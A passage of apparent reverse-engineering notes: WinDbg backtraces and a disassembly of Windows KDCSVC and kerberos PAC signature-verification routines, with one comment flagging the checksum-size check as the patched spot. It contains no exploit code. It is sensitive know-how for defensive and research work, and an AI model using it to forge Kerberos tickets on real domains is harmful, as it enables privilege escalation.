NTDSATQ!ATQ_CONTEXT::IOCompletion+0x31\n```\n\nKdcVerifyPacSignature\n\n```\nChildEBP RetAddr  Args to Child\n04e4f740 63a89f6f 00145238 04e4f91c 00000250 KDCSVC!KdcVerifyPacSignature\n04e4f770 63a89543 00145238 000ec8f0 04e4f91c KDCSVC!KdcVerifyAndResignPac+0xb3\n04e4f83c 63a87125 04e4f880 04e4fe74 00000000 KDCSVC!KdcInsertAuthorizationData+0x1d6\n04e4f99c 63a85055 000ec8f0 04e4fea0 04e4fe98 KDCSVC!I_GetTGSTicket+0x729\nkerberos!KerbVerifyPacsignature\nChildEBP RetAddr  Args to Child\n00aef7b8 71cb1ef3 00aefa70 0013d8f0 00000250 kerberos!KerbVerifyPacSignature\n00aef8fc 71cb1159 00000001 00aefab0 0017c1e8 kerberos!KerbCreateTokenFromTicket+0x1de\n00aefaec 4ab860d2 0016cce0 00000000 3c9b6229 kerberos!SpAcceptLsaModeContext+0xb09\n00aefb60 4abc94a8 00aefc18 00aefbf8 00aefbe0 LSASRV!WLsaAcceptContext+0x139\n```\n\nI_GetAsTicket\n\n```\nChildEBP RetAddr  Args to Child\n04e4fe38 63a8b80a 050b73b8 001583e8 04e4feb0 KDCSVC!I_GetASTicket\n04e4fed8 63a87305 00000000 050b73b8 001149a8 KDCSVC!KdcGetTicket+0x1b5\n04e4ff38 71fd1700 0015bc10 00000137 00000000 KDCSVC!KdcAtqDgIoCompletion+0x129\n04e4ff58 71fd1858 00000137 00000000 0015bc14 NTDSATQ!ATQ_CONTEXT::IOCompletion+0x31\n```\n\nKdcVerifyPacSignature\n\n```\nChildEBP RetAddr  Args to Child\n04e4f740 63a89f6f 00145418 04e4f91c 00000250 KDCSVC!KdcVerifyPacSignature\n04e4f770 63a89543 00145418 000ec8f0 04e4f91c KDCSVC!KdcVerifyAndResignPac+0xb3\n04e4f83c 63a87125 04e4f880 04e4fe74 00000000 KDCSVC!KdcInsertAuthorizationData+0x1d6\n04e4f99c 63a85055 000ec8f0 04e4fea0 04e4fe98 KDCSVC!I_GetTGSTicket+0x729\nkerberos!KerbVerifyPacsignature\nChildEBP RetAddr  Args to Child\n00c6f7b8 71cb1ef3 00c6fa70 0013d8f0 00000250 kerberos!KerbVerifyPacSignature\n00c6f8fc 71cb1159 00000001 00c6fab0 0017c190 kerberos!KerbCreateTokenFromTicket+0x1de\n00c6faec 4ab860d2 0016cce0 00000000 3f4a60da kerberos!SpAcceptLsaModeContext+0xb09\n00c6fb60 4abc94a8 00c6fc18 00c6fbf8 00c6fbe0 LSASRV!WLsaAcceptContext+0x139\n```\n\nSo, obviously I_GetAsTicket is called through the first query (AS), KdcVerifyPacSignature and\nkerberos!KerbVerifyPacsignature is called on the second request (TGT). Looks like the PAC is\nparsed/verified in the second query (TGT, makes sense).\n\n[*] Other backtraces for my review while logging in the domain from XP SP3 client\n\n```\nkd> g\nBreakpoint 4 hit\nkerberos!PAC_UnMarshal:\n001b:71d2d109 8bff            mov     edi,edi\nkd> kb\nChildEBP RetAddr  Args to Child\n009cf980 71d17acb 000b8780 00000290 009cfd84 kerberos!PAC_UnMarshal\n009cf9fc 71d02dcb 000fbd18 009cfc34 000d62b8 kerberos!KerbCreateTokenFromLogonTicket+0x2ec\n009cfc8c 75757814 009cfea8 00000002 000d62b8 kerberos!LsaApLogonUserEx2+0xa9e\n009cfcf8 75742941 009cfea8 00000002 000e23c8 LSASRV!NegLogonUserEx2+0x21d\n009cfe98 75742286 009cfea8 000b6040 00107500 LSASRV!LsapAuApiDispatchLogonUser+0x335\n009cfeac 75739429 00107500 000b4e90 000b6040 LSASRV!LpcLsaLogonUser+0x22\n009cfec4 7573934d 00107500 757cf738 000c7968 LSASRV!DispatchAPI+0x46\n009cff50 75738ca2 000b4e90 009cff98 7c809c55 LSASRV!LpcHandler+0x153\n009cff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n009cffb4 7c80b713 000c34e0 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n009cffec 00000000 75738d13 000c34e0 00000000 kernel32!BaseThreadStart+0x37\nkd> g\nBreakpoint 5 hit\nkerberos!PAC_ReMarshal:\n001b:71d2d188 8bff            mov     edi,edi\nkd> kb\nChildEBP RetAddr  Args to Child\n009cf89c 71d15b25 000b8780 00000290 009cf9cc kerberos!PAC_ReMarshal\n009cf96c 71d17b42 009cf9c4 000b8780 00000290 kerberos!KerbVerifyPacSignature+0x185\n009cf9fc 71d02dcb 000fbd18 009cfc34 000d62b8 kerberos!KerbCreateTokenFromLogonTicket+0x363\n009cfc8c 75757814 009cfea8 00000002 000d62b8 kerberos!LsaApLogonUserEx2+0xa9e\n009cfcf8 75742941 009cfea8 00000002 000e23c8 LSASRV!NegLogonUserEx2+0x21d\n009cfe98 75742286 009cfea8 000b6040 00107500 LSASRV!LsapAuApiDispatchLogonUser+0x335\n009cfeac 75739429 00107500 000b4e90 000b6040 LSASRV!LpcLsaLogonUser+0x22\n009cfec4 7573934d 00107500 757cf738 000c7968 LSASRV!DispatchAPI+0x46\n009cff50 75738ca2 000b4e90 009cff98 7c809c55 LSASRV!LpcHandler+0x153\n009cff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n009cffb4 7c80b713 000c34e0 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n009cffec 00000000 75738d13 000c34e0 00000000 kernel32!BaseThreadStart+0x37\nkd> g\nBreakpoint 4 hit\nkerberos!PAC_UnMarshal:\n001b:71d2d109 8bff            mov     edi,edi\nkd> kb\nChildEBP RetAddr  Args to Child\n009cf89c 71d15c04 000b8780 00000290 009cf9cc kerberos!PAC_UnMarshal\n009cf96c 71d17b42 009cf9c4 000b8780 00000290 kerberos!KerbVerifyPacSignature+0x264\n009cf9fc 71d02dcb 000fbd18 009cfc34 000d62b8 kerberos!KerbCreateTokenFromLogonTicket+0x363\n009cfc8c 75757814 009cfea8 00000002 000d62b8 kerberos!LsaApLogonUserEx2+0xa9e\n009cfcf8 75742941 009cfea8 00000002 000e23c8 LSASRV!NegLogonUserEx2+0x21d\n009cfe98 75742286 009cfea8 000b6040 00107500 LSASRV!LsapAuApiDispatchLogonUser+0x335\n009cfeac 75739429 00107500 000b4e90 000b6040 LSASRV!LpcLsaLogonUser+0x22\n009cfec4 7573934d 00107500 757cf738 000c7968 LSASRV!DispatchAPI+0x46\n009cff50 75738ca2 000b4e90 009cff98 7c809c55 LSASRV!LpcHandler+0x153\n009cff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n009cffb4 7c80b713 000c34e0 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n009cffec 00000000 75738d13 000c34e0 00000000 kernel32!BaseThreadStart+0x37\nkd> g\nBreakpoint 1 hit\nkerberos!PAC_UnmarshallValidationInfo:\n001b:71d2d466 8bff            mov     edi,edi\nkd> kb\nChildEBP RetAddr  Args to Child\n009cf898 71d15cd6 009cf9f0 000b87c8 000001f0 kerberos!PAC_UnmarshallValidationInfo\n009cf96c 71d17b42 009cf9c4 000b8780 00000290 kerberos!KerbVerifyPacSignature+0x336\n009cf9fc 71d02dcb 000fbd18 009cfc34 000d62b8 kerberos!KerbCreateTokenFromLogonTicket+0x363\n009cfc8c 75757814 009cfea8 00000002 000d62b8 kerberos!LsaApLogonUserEx2+0xa9e\n009cfcf8 75742941 009cfea8 00000002 000e23c8 LSASRV!NegLogonUserEx2+0x21d\n009cfe98 75742286 009cfea8 000b6040 00107500 LSASRV!LsapAuApiDispatchLogonUser+0x335\n009cfeac 75739429 00107500 000b4e90 000b6040 LSASRV!LpcLsaLogonUser+0x22\n009cfec4 7573934d 00107500 757cf738 000c7968 LSASRV!DispatchAPI+0x46\n009cff50 75738ca2 000b4e90 009cff98 7c809c55 LSASRV!LpcHandler+0x153\n009cff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n009cffb4 7c80b713 000c34e0 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n009cffec 00000000 75738d13 000c34e0 00000000 kernel32!BaseThreadStart+0x37\nkd> g\nBreakpoint 3 hit\nkerberos!PAC_DecodeValidationInformation:\n001b:71d2cf2e 6a14            push    14h\nkd> kb\nChildEBP RetAddr  Args to Child\n009cf884 71d2d47d 000b87c8 000001f0 009cf9f0 kerberos!PAC_DecodeValidationInformation\n009cf898 71d15cd6 009cf9f0 000b87c8 000001f0 kerberos!PAC_UnmarshallValidationInfo+0x17\n009cf96c 71d17b42 009cf9c4 000b8780 00000290 kerberos!KerbVerifyPacSignature+0x336\n009cf9fc 71d02dcb 000fbd18 009cfc34 000d62b8 kerberos!KerbCreateTokenFromLogonTicket+0x363\n009cfc8c 75757814 009cfea8 00000002 000d62b8 kerberos!LsaApLogonUserEx2+0xa9e\n009cfcf8 75742941 009cfea8 00000002 000e23c8 LSASRV!NegLogonUserEx2+0x21d\n009cfe98 75742286 009cfea8 000b6040 00107500 LSASRV!LsapAuApiDispatchLogonUser+0x335\n009cfeac 75739429 00107500 000b4e90 000b6040 LSASRV!LpcLsaLogonUser+0x22\n009cfec4 7573934d 00107500 757cf738 000c7968 LSASRV!DispatchAPI+0x46\n009cff50 75738ca2 000b4e90 009cff98 7c809c55 LSASRV!LpcHandler+0x153\n009cff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n009cffb4 7c80b713 000c34e0 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n009cffec 00000000 75738d13 000c34e0 00000000 kernel32!BaseThreadStart+0x37\nkd> g\nBreakpoint 8 hit\nkerberos!PPAC_IDL_VALIDATION_INFO_Decode:\n001b:71d2d6f5 8bff            mov     edi,edi\nkd> kb\nChildEBP RetAddr  Args to Child\n009cf844 71d2cf7f 000936f0 009cf9f0 000b89c0 kerberos!PPAC_IDL_VALIDATION_INFO_Decode\n009cf884 71d2d47d 000b87c8 000001f0 009cf9f0 kerberos!PAC_DecodeValidationInformation+0x51\n009cf898 71d15cd6 009cf9f0 000b87c8 000001f0 kerberos!PAC_UnmarshallValidationInfo+0x17\n009cf96c 71d17b42 009cf9c4 000b8780 00000290 kerberos!KerbVerifyPacSignature+0x336\n009cf9fc 71d02dcb 000fbd18 009cfc34 000d62b8 kerberos!KerbCreateTokenFromLogonTicket+0x363\n009cfc8c 75757814 009cfea8 00000002 000d62b8 kerberos!LsaApLogonUserEx2+0xa9e\n009cfcf8 75742941 009cfea8 00000002 000e23c8 LSASRV!NegLogonUserEx2+0x21d\n009cfe98 75742286 009cfea8 000b6040 00107500 LSASRV!LsapAuApiDispatchLogonUser+0x335\n009cfeac 75739429 00107500 000b4e90 000b6040 LSASRV!LpcLsaLogonUser+0x22\n009cfec4 7573934d 00107500 757cf738 000c7968 LSASRV!DispatchAPI+0x46\n009cff50 75738ca2 000b4e90 009cff98 7c809c55 LSASRV!LpcHandler+0x153\n009cff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n009cffb4 7c80b713 000c34e0 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n009cffec 00000000 75738d13 000c34e0 00000000 kernel32!BaseThreadStart+0x37\nkd> g\n```\n\n[*] More breakpoints when from XP SP3 client: Looks like there are two paths, to\nget the TGT ticket, and to get the service ticket. The last one is the interesting\nI think.\n\n```\nkd> kb\nChildEBP RetAddr  Args to Child\n0007f4c0 71cfbc26 00103828 000ed248 000c2f48 kerberos!KerbCacheTicket\n0007f68c 71cf3611 00101ce0 000f6c30 00000000 kerberos!KerbGetAuthenticationTicket+0xa77\n0007f760 71cf33c8 00101ce0 000f6c30 00000000 kerberos!KerbGetTicketGrantingTicket+0x2f4\n0007f794 71cf1db1 00000000 000f6c30 00000000 kerberos!KerbGetTicketForCredential+0x5d\n0007f7f4 71cf2d85 000f6c30 80000002 00000000 kerberos!KerbReferenceCredential+0x12a\n0007f9a8 7573c293 000f6c30 00000000 0007fe80 kerberos!SpInitLsaModeContext+0xae3\n0007fa20 7573ca9a 0007fbb0 0007fb90 0007fe80 LSASRV!WLsaInitContext+0x154\n0007fc14 7575dedc 00000000 000a5ad8 0007fe80 LSASRV!NegBuildRequestToken+0x53d\n0007fc48 7575de92 00108ef0 0007fe80 00000002 LSASRV!NegGenerateInitialToken+0x28\n0007fcac 7573c293 00108ef0 00000000 0007fe80 LSASRV!NegInitLsaModeContext+0x3e6\n0007fd24 7573c17c 000f9bf8 000f9c00 0007fe80 LSASRV!WLsaInitContext+0x154\n0007feac 75739429 000f9bd0 000b5100 000f9ce0 LSASRV!LpcInitContext+0x1a2\n0007fec4 7573934d 000f9bd0 757cf738 0009af50 LSASRV!DispatchAPI+0x46\n0007ff50 75738ca2 000b5100 0007ff98 7c809c55 LSASRV!LpcHandler+0x153\n0007ff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n0007ffb4 7c80b713 000d3758 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n0007ffec 00000000 75738d13 000d3758 00000000 kernel32!BaseThreadStart+0x37\nkd> g\nBreakpoint 13 hit\nkerberos!KerbCacheTicket:\n001b:71cf9a79 8bff            mov     edi,edi\nkd> kb\nChildEBP RetAddr  Args to Child\n0007f6ec 71cf9a6f 00103818 000d5240 000c2f48 kerberos!KerbCacheTicket\n0007f7cc 71cf722e 00101ce0 000f6c30 00000000 kerberos!KerbGetServiceTicket+0x893\n0007f9a8 7573c293 00000002 00000000 0007fe80 kerberos!SpInitLsaModeContext+0xd60\n0007fa20 7573ca9a 0007fbb0 0007fb90 0007fe80 LSASRV!WLsaInitContext+0x154\n0007fc14 7575dedc 00000000 000a5ad8 0007fe80 LSASRV!NegBuildRequestToken+0x53d\n0007fc48 7575de92 00108ef0 0007fe80 00000002 LSASRV!NegGenerateInitialToken+0x28\n0007fcac 7573c293 00108ef0 00000000 0007fe80 LSASRV!NegInitLsaModeContext+0x3e6\n0007fd24 7573c17c 000f9bf8 000f9c00 0007fe80 LSASRV!WLsaInitContext+0x154\n0007feac 75739429 000f9bd0 000b5100 000f9ce0 LSASRV!LpcInitContext+0x1a2\n0007fec4 7573934d 000f9bd0 757cf738 0009af50 LSASRV!DispatchAPI+0x46\n0007ff50 75738ca2 000b5100 0007ff98 7c809c55 LSASRV!LpcHandler+0x153\n0007ff74 75738d66 0009bd98 00000000 00a4fab0 LSASRV!SpmPoolThreadBase+0xb9\n0007ffb4 7c80b713 000d3758 00000000 00a4fab0 LSASRV!LsapThreadBase+0x91\n0007ffec 00000000 75738d13 000d3758 00000000 kernel32!BaseThreadStart+0x37\nkd> g\n```\n\nReaching the important point on my case:\n\n```\nkd> uf KDCSVC!KdcVerifyPacSignature\nKDCSVC!KdcVerifyPacSignature:\n63a89013 8bff            mov     edi,edi\n63a89015 55              push    ebp\n63a89016 8bec            mov     ebp,esp\n63a89018 81eca8000000    sub     esp,0A8h\n63a8901e a10010ab63      mov     eax,dword ptr [KDCSVC!__security_cookie (63ab1000)]\n63a89023 53              push    ebx\n63a89024 56              push    esi\n63a89025 8b7514          mov     esi,dword ptr [ebp+14h]\n63a89028 8945fc          mov     dword ptr [ebp-4],eax\n63a8902b 8b4508          mov     eax,dword ptr [ebp+8]\n63a8902e 57              push    edi\n63a8902f 8945ac          mov     dword ptr [ebp-54h],eax\n63a89032 8b450c          mov     eax,dword ptr [ebp+0Ch]\n63a89035 6a0f            push    0Fh\n63a89037 33db            xor     ebx,ebx\n63a89039 8945a8          mov     dword ptr [ebp-58h],eax\n63a8903c 59              pop     ecx\n63a8903d ff7510          push    dword ptr [ebp+10h]\n63a89040 66899d58ffffff  mov     word ptr [ebp-0A8h],bx\n63a89047 33c0            xor     eax,eax\n63a89049 8dbd5affffff    lea     edi,[ebp-0A6h]\n63a8904f f3ab            rep stos dword ptr es:[edi]\n63a89051 56              push    esi\n63a89052 8975b0          mov     dword ptr [ebp-50h],esi\n63a89055 895dbc          mov     dword ptr [ebp-44h],ebx\n63a89058 895db8          mov     dword ptr [ebp-48h],ebx\n63a8905b 895db4          mov     dword ptr [ebp-4Ch],ebx\n63a8905e 66ab            stos    word ptr es:[edi]\n63a89060 e81feeffff      call    KDCSVC!PAC_UnMarshal (63a87e84)\n63a89065 85c0            test    eax,eax\n63a89067 0f84178d0000    je      KDCSVC!KdcVerifyPacSignature+0x261 (63a91d84)\n\nKDCSVC!KdcVerifyPacSignature+0x5a:\n63a8906d 8d8558ffffff    lea     eax,[ebp-0A8h]\n63a89073 50              push    eax\n63a89074 b92810ab63      mov     ecx,offset KDCSVC!SecData (63ab1028)\n63a89079 e8668bffff      call    KDCSVC!CSecurityData::GetKrbtgtTicketInfo (63a81be4)\n63a8907e 3bc3            cmp     eax,ebx\n63a89080 8945bc          mov     dword ptr [ebp-44h],eax\n63a89083 0f856c8c0000    jne     KDCSVC!KdcVerifyPacSignature+0x72 (63a91cf5)\n\nKDCSVC!KdcVerifyPacSignature+0x7d:\n63a89089 53              push    ebx\n63a8908a 6a06            push    6\n63a8908c 56              push    esi\n63a8908d e846ecffff      call    KDCSVC!PAC_Find (63a87cd8)\n63a89092 8bd8            mov     ebx,eax\n63a89094 85db            test    ebx,ebx\n63a89096 0f8488010000    je      KDCSVC!KdcVerifyPacSignature+0x2d1 (63a89224)\n\nKDCSVC!KdcVerifyPacSignature+0x90:\n63a8909c 8b4b04          mov     ecx,dword ptr [ebx+4]\n63a8909f 83f904          cmp     ecx,4\n63a890a2 0f827c010000    jb      KDCSVC!KdcVerifyPacSignature+0x2d1 (63a89224)\n\nKDCSVC!KdcVerifyPacSignature+0x9c:\n63a890a8 8b4308          mov     eax,dword ptr [ebx+8]\n63a890ab 83c1fc          add     ecx,0FFFFFFFCh\n63a890ae 8d5004          lea     edx,[eax+4]\n63a890b1 894598          mov     dword ptr [ebp-68h],eax\n63a890b4 8bc1            mov     eax,ecx\n63a890b6 c1e902          shr     ecx,2\n63a890b9 8bf2            mov     esi,edx\n63a890bb 8d7de8          lea     edi,[ebp-18h]\n63a890be f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n63a890c0 8bc8            mov     ecx,eax\n63a890c2 83e103          and     ecx,3\n63a890c5 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]\n63a890c7 8b4b04          mov     ecx,dword ptr [ebx+4]\n63a890ca 83e904          sub     ecx,4\n63a890cd 8bfa            mov     edi,edx\n63a890cf 8bd1            mov     edx,ecx\n63a890d1 c1e902          shr     ecx,2\n63a890d4 33c0            xor     eax,eax\n63a890d6 f3ab            rep stos dword ptr es:[edi]\n63a890d8 6a00            push    0\n63a890da 8bca            mov     ecx,edx\n63a890dc 6a07            push    7\n63a890de ff75b0          push    dword ptr [ebp-50h]\n63a890e1 83e103          and     ecx,3\n63a890e4 f3aa            rep stos byte ptr es:[edi]\n63a890e6 e8edebffff      call    KDCSVC!PAC_Find (63a87cd8)\n63a890eb 85c0            test    eax,eax\n63a890ed 89459c          mov     dword ptr [ebp-64h],eax\n63a890f0 0f842e010000    je      KDCSVC!KdcVerifyPacSignature+0x2d1 (63a89224)\n\nKDCSVC!KdcVerifyPacSignature+0xea:\n63a890f6 8b5004          mov     edx,dword ptr [eax+4]\n63a890f9 83fa04          cmp     edx,4\n63a890fc 0f8222010000    jb      KDCSVC!KdcVerifyPacSignature+0x2d1 (63a89224)\n\nKDCSVC!KdcVerifyPacSignature+0xf6:\n63a89102 8b4808          mov     ecx,dword ptr [eax+8]\n63a89105 8d7104          lea     esi,[ecx+4]\n63a89108 894da0          mov     dword ptr [ebp-60h],ecx\n63a8910b 8d4afc          lea     ecx,[edx-4]\n63a8910e 8bd1            mov     edx,ecx\n63a89110 c1e902          shr     ecx,2\n63a89113 ff7510          push    dword ptr [ebp+10h]\n63a89116 8975a4          mov     dword ptr [ebp-5Ch],esi\n63a89119 ff75b0          push    dword ptr [ebp-50h]\n63a8911c 8d7dc0          lea     edi,[ebp-40h]\n63a8911f f3a5            rep movs dword ptr es:[edi],dword ptr [esi]\n63a89121 8bca            mov     ecx,edx\n63a89123 83e103          and     ecx,3\n63a89126 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]\n63a89128 8b4804          mov     ecx,dword ptr [eax+4]\n63a8912b 8b7da4          mov     edi,dword ptr [ebp-5Ch]\n63a8912e 83e904          sub     ecx,4\n63a89131 8bd1            mov     edx,ecx\n63a89133 c1e902          shr     ecx,2\n63a89136 33c0            xor     eax,eax\n63a89138 f3ab            rep stos dword ptr es:[edi]\n63a8913a 8bca            mov     ecx,edx\n63a8913c 83e103          and     ecx,3\n63a8913f f3aa            rep stos byte ptr es:[edi]\n63a89141 e810e5ffff      call    KDCSVC!PAC_ReMarshal (63a87656)\n63a89146 84c0            test    al,al\n63a89148 0f84d6000000    je      KDCSVC!KdcVerifyPacSignature+0x2d1 (63a89224)\n\nKDCSVC!KdcVerifyPacSignature+0x142:\n63a8914e 8d45b8          lea     eax,[ebp-48h]\n63a89151 50              push    eax\n63a89152 8b4598          mov     eax,dword ptr [ebp-68h]\n63a89155 ff30            push    dword ptr [eax]\n63a89157 e8538affff      call    KDCSVC!CDLocateCheckSum (63a81baf)\n63a8915c 85c0            test    eax,eax\n63a8915e 0f8ce38b0000    jl      KDCSVC!KdcVerifyPacSignature+0x224 (63a91d47)\n\nKDCSVC!KdcVerifyPacSignature+0x158:\n63a89164 8b55b8          mov     edx,dword ptr [ebp-48h]\n63a89167 837a0414        cmp     dword ptr [edx+4],14h // DEBUG HERE IS THE ORIGINAL PATCH\n63a8916b 0f87138c0000    ja      KDCSVC!KdcVerifyPacSignature+0x261 (63a91d84)\n\nKDCSVC!KdcVerifyPacSignature+0x165:\n63a89171 8b4a20          mov     ecx,dword ptr [edx+20h]\n63a89174 85c9            test    ecx,ecx\n63a89176 8d45b4          lea     eax,[ebp-4Ch]\n63a89179 50              push    eax\n63a8917a 6a11            push    11h\n63a8917c 0f857e8b0000    jne     KDCSVC!KdcVerifyPacSignature+0x172 (63a91d00)\n\nKDCSVC!KdcVerifyPacSignature+0x183:\n63a89182 8b45ac          mov     eax,dword ptr [ebp-54h]\n63a89185 ff7004          push    dword ptr [eax+4]\n63a89188 ff7008          push    dword ptr [eax+8]\n63a8918b ff521c          call    dword ptr [edx+1Ch]\n\nKDCSVC!KdcVerifyPacSignature+0x18f:\n63a8918e 85c0            test    eax,eax\n63a89190 0f8cee8b0000    jl      KDCSVC!KdcVerifyPacSignature+0x261 (63a91d84)\n\nKDCSVC!KdcVerifyPacSignature+0x197:\n63a89196 ff75b0          push    dword ptr [ebp-50h]\n63a89199 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a8919c ff7510          push    dword ptr [ebp+10h]\n63a8919f ff75b4          push    dword ptr [ebp-4Ch]\n63a891a2 ff5010          call    dword ptr [eax+10h]\n63a891a5 8d45d4          lea     eax,[ebp-2Ch]\n63a891a8 50              push    eax\n63a891a9 ff75b4          push    dword ptr [ebp-4Ch]\n63a891ac 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a891af ff5014          call    dword ptr [eax+14h]\n63a891b2 8d45b4          lea     eax,[ebp-4Ch]\n63a891b5 50              push    eax\n63a891b6 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a891b9 ff5018          call    dword ptr [eax+18h]\n63a891bc 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a891bf 8b4804          mov     ecx,dword ptr [eax+4]\n63a891c2 8b4304          mov     eax,dword ptr [ebx+4]\n63a891c5 83e804          sub     eax,4\n63a891c8 3bc8            cmp     ecx,eax\n63a891ca 754e            jne     KDCSVC!KdcVerifyPacSignature+0x2ba (63a8921a)\n\nKDCSVC!KdcVerifyPacSignature+0x1d1:\n63a891cc 8d7de8          lea     edi,[ebp-18h]\n63a891cf 8d75d4          lea     esi,[ebp-2Ch]\n63a891d2 33c0            xor     eax,eax\n63a891d4 f3a6            repe cmps byte ptr [esi],byte ptr es:[edi]\n63a891d6 7542            jne     KDCSVC!KdcVerifyPacSignature+0x2ba (63a8921a)\n\nKDCSVC!KdcVerifyPacSignature+0x1e1:\n63a891d8 8b45a8          mov     eax,dword ptr [ebp-58h]\n63a891db 817820f6010000  cmp     dword ptr [eax+20h],1F6h\n63a891e2 0f852c8b0000    jne     KDCSVC!KdcVerifyPacSignature+0x1f1 (63a91d14)\n\nKDCSVC!KdcVerifyPacSignature+0x2ee:\n63a891e8 837dbc29        cmp     dword ptr [ebp-44h],29h\n63a891ec 0f841e8c0000    je      KDCSVC!KdcVerifyPacSignature+0x2f4 (63a91e10)\n\nKDCSVC!KdcVerifyPacSignature+0x340:\n63a891f2 837db400        cmp     dword ptr [ebp-4Ch],0\n63a891f6 5f              pop     edi\n63a891f7 5e              pop     esi\n63a891f8 5b              pop     ebx\n63a891f9 0f85668c0000    jne     KDCSVC!KdcVerifyPacSignature+0x349 (63a91e65)\n\nKDCSVC!KdcVerifyPacSignature+0x357:\n63a891ff 8d8558ffffff    lea     eax,[ebp-0A8h]\n63a89205 50              push    eax\n63a89206 e8498cffff      call    KDCSVC!FreeTicketInfo (63a81e54)\n63a8920b 8b4dfc          mov     ecx,dword ptr [ebp-4]\n63a8920e 8b45bc          mov     eax,dword ptr [ebp-44h]\n63a89211 e83f89ffff      call    KDCSVC!__security_check_cookie (63a81b55)\n63a89216 c9              leave\n63a89217 c21000          ret     10h\n\nKDCSVC!KdcVerifyPacSignature+0x2ba:\n63a8921a 683092a863      push    offset KDCSVC!`string' (63a89230)\n63a8921f e9bb8b0000      jmp     KDCSVC!KdcVerifyPacSignature+0x2bf (63a91ddf)\n\nKDCSVC!KdcVerifyPacSignature+0x2d1:\n63a89224 c745bc3c000000  mov     dword ptr [ebp-44h],3Ch\n63a8922b e9c18b0000      jmp     KDCSVC!KdcVerifyPacSignature+0x2d8 (63a91df1)\n\nKDCSVC!KdcVerifyPacSignature+0x72:\n63a91cf5 50              push    eax\n63a91cf6 e884120100      call    KDCSVC!KerbMapKerbError (63aa2f7f)\n63a91cfb e9f1000000      jmp     KDCSVC!KdcVerifyPacSignature+0x2d8 (63a91df1)\n\nKDCSVC!KdcVerifyPacSignature+0x172:\n63a91d00 8d45e8          lea     eax,[ebp-18h]\n63a91d03 50              push    eax\n63a91d04 8b45ac          mov     eax,dword ptr [ebp-54h]\n63a91d07 ff7004          push    dword ptr [eax+4]\n63a91d0a ff7008          push    dword ptr [eax+8]\n63a91d0d ffd1            call    ecx\n63a91d0f e97a74ffff      jmp     KDCSVC!KdcVerifyPacSignature+0x18f (63a8918e)\n\nKDCSVC!KdcVerifyPacSignature+0x1f1:\n63a91d14 f6401c40        test    byte ptr [eax+1Ch],40h\n63a91d18 0f85ca74ffff    jne     KDCSVC!KdcVerifyPacSignature+0x2ee (63a891e8)\n\nKDCSVC!KdcVerifyPacSignature+0x1fb:\n63a91d1e 687bffffff      push    0FFFFFF7Bh\n63a91d23 ff7584          push    dword ptr [ebp-7Ch]\n63a91d26 e848fefeff      call    KDCSVC!KerbGetKeyFromList (63a81b73)\n63a91d2b 8bf0            mov     esi,eax\n63a91d2d 85f6            test    esi,esi\n63a91d2f 0f84b374ffff    je      KDCSVC!KdcVerifyPacSignature+0x2ee (63a891e8)\n\nKDCSVC!KdcVerifyPacSignature+0x212:\n63a91d35 8d45b8          lea     eax,[ebp-48h]\n63a91d38 50              push    eax\n63a91d39 8b45a0          mov     eax,dword ptr [ebp-60h]\n63a91d3c ff30            push    dword ptr [eax]\n63a91d3e e86cfefeff      call    KDCSVC!CDLocateCheckSum (63a81baf)\n63a91d43 85c0            test    eax,eax\n63a91d45 7d0c            jge     KDCSVC!KdcVerifyPacSignature+0x230 (63a91d53)\n\nKDCSVC!KdcVerifyPacSignature+0x224:\n63a91d47 c745bc0f000000  mov     dword ptr [ebp-44h],0Fh\n63a91d4e e99f74ffff      jmp     KDCSVC!KdcVerifyPacSignature+0x340 (63a891f2)\n\nKDCSVC!KdcVerifyPacSignature+0x230:\n63a91d53 8b45b8          mov     eax,dword ptr [ebp-48h]\n63a91d56 8b4820          mov     ecx,dword ptr [eax+20h]\n63a91d59 85c9            test    ecx,ecx\n63a91d5b 7414            je      KDCSVC!KdcVerifyPacSignature+0x24e (63a91d71)\n\nKDCSVC!KdcVerifyPacSignature+0x23a:\n63a91d5d 8d45b4          lea     eax,[ebp-4Ch]\n63a91d60 50              push    eax\n63a91d61 6a11            push    11h\n63a91d63 8d45c0          lea     eax,[ebp-40h]\n63a91d66 50              push    eax\n63a91d67 ff7604          push    dword ptr [esi+4]\n63a91d6a ff7608          push    dword ptr [esi+8]\n63a91d6d ffd1            call    ecx\n63a91d6f eb0f            jmp     KDCSVC!KdcVerifyPacSignature+0x25d (63a91d80)\n\nKDCSVC!KdcVerifyPacSignature+0x24e:\n63a91d71 8d4db4          lea     ecx,[ebp-4Ch]\n63a91d74 51              push    ecx\n63a91d75 6a11            push    11h\n63a91d77 ff7604          push    dword ptr [esi+4]\n63a91d7a ff7608          push    dword ptr [esi+8]\n63a91d7d ff501c          call    dword ptr [eax+1Ch]\n\nKDCSVC!KdcVerifyPacSignature+0x25d:\n63a91d80 85c0            test    eax,eax\n63a91d82 7d0c            jge     KDCSVC!KdcVerifyPacSignature+0x26d (63a91d90)\n\nKDCSVC!KdcVerifyPacSignature+0x261:\n63a91d84 c745bc3c000000  mov     dword ptr [ebp-44h],3Ch\n63a91d8b e96274ffff      jmp     KDCSVC!KdcVerifyPacSignature+0x340 (63a891f2)\n\nKDCSVC!KdcVerifyPacSignature+0x26d:\n63a91d90 8d45e8          lea     eax,[ebp-18h]\n63a91d93 50              push    eax\n63a91d94 8b45b8          mov     